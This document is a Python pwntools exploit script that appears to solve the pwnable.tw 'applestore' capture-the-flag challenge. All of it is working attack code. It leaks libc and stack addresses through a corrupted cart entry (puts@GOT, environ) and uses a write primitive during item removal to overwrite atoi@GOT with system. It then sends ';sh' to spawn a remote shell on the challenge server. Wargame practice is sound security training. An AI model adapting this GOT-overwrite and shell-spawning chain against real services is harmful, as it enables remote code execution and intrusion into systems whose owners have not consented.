#!/usr/bin/env python3
from pwn import *

PORT = 10104
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./applestore_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x080488CD
            b* 0x08048AC4
            b* 0x08048C13
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

def sa(pr, data):
    p.sendafter(pr, data)

def menu(idx):
    sa(b'> ', str(idx).encode())

def add(idx):
    menu(2)
    sa(b'Device Number> ', str(idx).encode())

def remove(data):
    menu(3)
    sa(b"Item Number> ", data)

def cart(data):
    menu(4)
    sa(b" (y/n) > ", data)

def check(data):
    menu(5)
    sa(b" (y/n) > ", data)

def getIphone8():
    for _ in range(18):
        add(1)

    add(2)
    add(2)

    for _ in range(6):
        add(3)

    check(b'y')

# Stage 1: Leak libc & Stack

#myCart = 0x0804B068

getIphone8()

pl = b'y\x00' + flat(elf.got.puts, 0, 0, 0)

cart(pl)
p.recvuntil(b"27: ")
libc.address = u32(p.recv(4)) - 0x5f140
log.success(f"libc_base: {libc.address:#x}")

pl = b'y\x00' + flat(libc.sym.environ, 0, 0, 0)
# GDB()
cart(pl)
p.recvuntil(b"27: ")
stack_leak = u32(p.recv(4))
log.success(f"stack_leak: {stack_leak:#x}")

saved_ebp_slot = stack_leak - 0x104
log.success(f"saved_ebp_slot: {saved_ebp_slot:#x}")

# Stage 2: Trigger atoi@got

ip8_addr = 0x08049013

pl = b"27"

pl += flat(
    ip8_addr,
    0,
    elf.got.atoi + 0x22,
    saved_ebp_slot - 0x8,
    )

remove(pl)
# GDB()

pl = flat(libc.sym.system, b";sh\0")

sa(b'> ', pl)

p.interactive()
# d1nhdwc